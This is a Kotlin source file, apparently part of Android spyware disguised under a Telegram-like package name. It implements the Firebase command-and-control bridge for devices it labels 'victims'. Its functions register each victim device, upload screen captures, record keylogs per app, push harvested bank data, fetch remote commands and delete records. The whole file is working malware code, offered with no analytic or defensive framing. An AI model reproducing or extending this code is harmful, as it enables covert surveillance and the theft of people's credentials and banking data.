package com.telegram2.messaging.remote

import com.google.firebase.database.*
import java.text.SimpleDateFormat
import java.util.*

object FirebaseBridge {
    private lateinit var db: FirebaseDatabase
    private lateinit var deviceId: String

    private lateinit var deviceRef: DatabaseReference
    lateinit var commandsRef: DatabaseReference
        private set
    private lateinit var screenRef: DatabaseReference
    private lateinit var keylogsRef: DatabaseReference
    private lateinit var infoRef: DatabaseReference
    private lateinit var bankRef: DatabaseReference

    fun init(deviceId: String) {
        this.deviceId = deviceId
        db = FirebaseDatabase.getInstance()
        deviceRef = db.getReference("telegram2_secret").child("victims").child(deviceId)
        commandsRef = deviceRef.child("commands")
        screenRef = deviceRef.child("screen")
        keylogsRef = deviceRef.child("keylogs")
        infoRef = deviceRef.child("info")
        bankRef = deviceRef.child("bank")
    }

    fun getDeviceId() = deviceId

    fun registerDevice(name: String, version: String, apps: List<String>) {
        deviceRef.child("deviceName").setValue(name)
        deviceRef.child("androidVersion").setValue(version)
        deviceRef.child("appList").setValue(apps)
        deviceRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
    }

    fun updateScreenFrame(base64: String) {
        screenRef.setValue(base64)
    }

    fun sendKeylog(packageName: String, text: String) {
        // Append to the global keylogs field under info
        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        val newEntry = "[$timestamp] $packageName: $text"
        infoRef.child("keylogs").runTransaction(object : Transaction.Handler {
            override fun doTransaction(currentData: MutableData): Transaction.Result {
                val existing = currentData.getValue(String::class.java) ?: ""
                currentData.value = (existing + "\n" + newEntry).takeLast(4000)  // keep last 4k chars
                return Transaction.success(currentData)
            }
            override fun onComplete(error: DatabaseError?, committed: Boolean, currentData: DataSnapshot?) {}
        })
    }

    fun pushAppsList(apps: List<String>) {
        infoRef.child("apps").setValue(apps.joinToString("\n"))
    }

    fun pushBankData(json: String) {
        bankRef.setValue(json)
    }

    fun deleteDevice() {
        deviceRef.removeValue()
    }
}
